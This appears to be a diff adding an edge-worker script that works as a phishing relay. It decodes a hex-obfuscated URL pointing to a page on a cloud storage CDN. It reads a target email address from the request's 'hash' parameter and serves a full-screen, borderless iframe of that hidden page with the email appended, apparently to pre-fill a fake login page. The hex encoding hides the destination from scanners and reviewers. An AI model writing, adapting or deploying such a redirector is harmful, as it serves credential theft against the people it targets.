@@ -1,0 +1,85 @@
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request));
+});
+
+async function handleRequest(request) {
+
+  const BASE_URL_HEX = '68747470733a2f2f61636365737370726f66696c6539383833796864697536336d397334686475373836337479676864687569383733362e73666f332e63646e2e6469676974616c6f6365616e7370616365732e636f6d2f636f6e6e656374706f696e742e68746d6c';
+  
+
+  let BASE_URL;
+  try {
+    BASE_URL = hexToString(BASE_URL_HEX);
+  } catch (e) {
+    return new Response('Error: Failed to decode base URL', {
+      status: 500,
+      headers: { 'content-type': 'text/plain' },
+    });
+  }
+
+  // Parse the request URL to extract query parameters
+  const url = new URL(request.url);
+  let hash = url.searchParams.get('hash');
+
+  // Debug: Log the raw hash value (remove after testing)
+  console.log('Raw hash:', hash);
+
+  // Error: Missing or empty hash parameter
+  if (!hash) {
+    return new Response('Error: Missing or empty hash parameter', {
+      status: 400,
+      headers: { 'content-type': 'text/plain' },
+    });
+  }
+
+  // Decode URL-encoded characters (e.g., %23 for #)
+  hash = decodeURIComponent(hash);
+
+  // Strip leading '#' if present
+  const cleanedHash = hash.startsWith('#') ? hash.substring(1) : hash;
+
+  // Debug: Log the cleaned hash (remove after testing)
+  console.log('Cleaned hash:', cleanedHash);
+
+  // Validate fragment (must be email-like format, block dangerous characters)
+  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+  if (!emailRegex.test(cleanedHash) || /[<>\'\"\\;]/.test(cleanedHash) || cleanedHash.includes('javascript:')) {
+    return new Response('Error: Invalid fragment', {
+      status: 400,
+      headers: { 'content-type': 'text/plain' },
+    });
+  }
+
+  // Construct iframe src by appending fragment (no encoding)
+  const iframeSrc = `${BASE_URL}#${cleanedHash}`;
+
+  // Generate HTML response with iframe
+  const html = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <style>
+            body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
+            iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; }
+        </style>
+    </head>
+    <body>
+        <iframe src="${iframeSrc}"></iframe>
+    </body>
+    </html>
+  `;
+
+  return new Response(html, {
+    headers: { 'content-type': 'text/html;charset=UTF-8' },
+  });
+}
+
+// Helper function to decode hex to string
+function hexToString(hex) {
+  let str = '';
+  for (let i = 0; i < hex.length; i += 2) {
+    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+  }
+  return str;
+}
